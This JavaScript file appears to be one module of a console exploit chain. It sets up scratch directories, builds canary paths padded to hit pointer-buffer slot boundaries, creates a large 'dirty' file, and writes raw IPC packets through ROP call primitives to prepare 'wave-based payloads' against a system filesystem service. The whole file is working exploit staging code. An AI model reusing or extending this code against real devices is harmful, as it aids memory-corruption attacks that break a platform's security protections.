// Scratch directory lifecycle for wave-based payloads.
// Depends on: filesystem.js (ipcCreateDirectory, ipcCreateFile, ipcOpenFile,
//   ipcDeleteDirectoryRecursively, ipcCommit), format.js (hex32)

// Pad a path prefix to exactly `length` characters using nested directories.
// Used to build canary paths that hit specific pointer-buffer slot boundaries.
function normalizedPath(prefix, length) {
    var text = prefix;
    while (text.length < length) {
        var remaining = length - text.length;
        if (remaining === 1) { text += "A"; }
        else { text += "/" + "A".repeat(Math.min(32, remaining - 1)); }
    }
    return text;
}

// Create the full scratch tree: root, canary chain, span markers,
// selected directory, and dirty data file.
//
// config: { scratchDir, canaryLength, dirtyFileSize, spanSegments }
//   scratchDir:    unique root like "/NS2_TRY001_a3f"
//   canaryLength:  target canary path length (default 0x5A0)
//   dirtyFileSize: dirty file size in bytes (default 0x800000 = 8 MiB)
//   spanSegments:  directory names for span tree (default ["S0A","S1A","S2A"])
//
// Returns: { ok, canaryPath, dirtyFilePath, markerPath, selectedDir,
//            selectedReady, spanSegments, logs[] }
function createScratchTree(handle, config) {
    var logs = [];
    var canaryLen = config.canaryLength || 0x5A0;
    var dirtySize = config.dirtyFileSize || 0x800000;
    var segments = config.spanSegments || ["S0A", "S1A", "S2A"];

    var salt = (Number(call_rop(F_Tick) & 0xFFFFFFn)).toString(16);
    var canaryPath = normalizedPath(
        config.scratchDir + "/" + salt + "_canary", canaryLen);
    logs.push("canary path length=" + canaryPath.length +
        " (target " + canaryLen + ")");

    // Root directory
    var rootRc = ipcCreateDirectory(handle, config.scratchDir);

    // Canary chain: nested directories + final file
    var parts = canaryPath.slice(1).split("/");
    var mkOk = 0, mkErr = 0, mkSamples = [];
    for (var i = 2; i < parts.length; i++) {
        var path = "/" + parts.slice(0, i).join("/");
        var rc = ipcCreateDirectory(handle, path);
        if (rc === 0 || (rc & 0x3FFFFF) === 0x402) mkOk++;
        else {
            mkErr++;
            if (mkSamples.length < 3)
                mkSamples.push("i=" + i + ",len=" + path.length +
                    ",rc=0x" + rc.toString(16));
        }
    }
    var canaryRc = ipcCreateFile(handle, canaryPath, 1);
    logs.push("canary mkdir=" + mkOk + "/" + (parts.length - 2) +
        " err=" + mkErr + " root=" + hex32(rootRc) +
        " errors=[" + mkSamples.join("; ") + "]" +
        " create=" + hex32(canaryRc));

    // Span marker tree
    var spanDirs = [config.scratchDir];
    var running = config.scratchDir;
    for (var i = 0; i < segments.length; i++) {
        running += "/" + segments[i];
        spanDirs.push(running);
    }
    var spanOk = 0;
    for (var i = 0; i < spanDirs.length; i++) {
        var rc = ipcCreateDirectory(handle, spanDirs[i]);
        if (rc === 0 || (rc & 0x3FFFFF) === 0x402) spanOk++;
    }
    var markerPath = running + "/SPAN_MARKER";
    var markerRc = ipcCreateFile(handle, markerPath, 1);
    logs.push("span mkdir=" + spanOk + "/" + spanDirs.length +
        " marker=" + hex32(markerRc));

    // Selected directory (for positive profile canary redirect)
    var selectedDir = config.scratchDir + "/selected";
    var selRc = ipcCreateDirectory(handle, selectedDir);
    logs.push("selected=" + hex32(selRc) +
        " ready=" + (selRc === 0));

    // Dirty data file
    var dirtyFilePath = config.scratchDir + "/big8";
    var dfRc = ipcCreateFile(handle, dirtyFilePath, dirtySize);
    logs.push("dirty file=" + hex32(dfRc) +
        " size=0x" + dirtySize.toString(16));

    return {
        ok: rootRc === 0 && canaryRc === 0 && markerRc === 0 && dfRc === 0,
        canaryPath: canaryPath,
        dirtyFilePath: dirtyFilePath,
        markerPath: markerPath,
        selectedDir: selectedDir,
        selectedReady: selRc === 0,
        spanSegments: segments,
        logs: logs
    };
}

// Write dirtyFileSize bytes to the dirty file (open, write, close cycle).
// writeBuf: pre-allocated buffer of at least dirtyFileSize bytes, filled.
// writePkt: pre-allocated packet buffer (allocPage(0x2000)).
function writeDirtyData(handle, dirtyFilePath, dirtyFileSize, writeBuf, writePkt) {
    var writer = ipcOpenFile(handle, dirtyFilePath, 3);
    if (!writer) return false;

    // Three u64 CMIF inputs (offset, write option, size): 14 raw words,
    // matching packet() in both reference ports.
    prepPacket(writePkt, (4 | (1 << 20)) >>> 0, 0x0E, []);
    write32(writePkt + 8n, BigInt(dirtyFileSize));
    write32(writePkt + 12n, BigInt(Number(writeBuf & 0xFFFFFFFFn)));
    write32(writePkt + 16n, BigInt(((1 |
        (Number((writeBuf >> 36n) & 7n) << 2) |
        (Number((writeBuf >> 32n) & 15n) << 28)) >>> 0)));
    write32(writePkt + 0x20n, 0x49434653n);
    write32(writePkt + 0x28n, 1n);
    write32(writePkt + 0x30n, 0n);
    write64(writePkt + 0x38n, 0n);
    write64(writePkt + 0x40n, BigInt(dirtyFileSize));
    sendIPC(writer, writePkt);
    var result = cmifReply(writePkt).result;
    closeHandle(writer);
    return result === 0;
}

// Delete the scratch tree recursively and commit the deletion.
function removeScratchTree(handle, scratchDir) {
    var removeResult = ipcDeleteDirectoryRecursively(handle, scratchDir);
    var commitResult = ipcCommit(handle);
    return { remove: removeResult, commit: commitResult };
}
